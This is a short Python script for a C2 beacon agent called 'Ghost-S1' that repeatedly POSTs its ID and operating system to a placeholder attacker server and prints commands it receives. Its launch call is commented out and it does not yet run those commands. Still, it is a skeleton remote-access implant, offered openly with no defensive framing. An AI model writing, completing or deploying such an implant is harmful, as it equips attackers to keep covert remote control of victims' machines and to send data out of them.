import requests
import time
import platform

AGENT_ID = "Ghost-S1"
C2_URL = "http://YOUR_C2_SERVER_IP:5000/api/beacon"

def start_agent():
    while True:
        try:
            data = {"id": AGENT_ID, "os": platform.system()}
            response = requests.post(C2_URL, json=data)
            if response.status_code == 200:
                print(f"Command from SayerLinux: {response.json().get('command')}")
            time.sleep(10)
        except:
            time.sleep(30)

# start_agent()
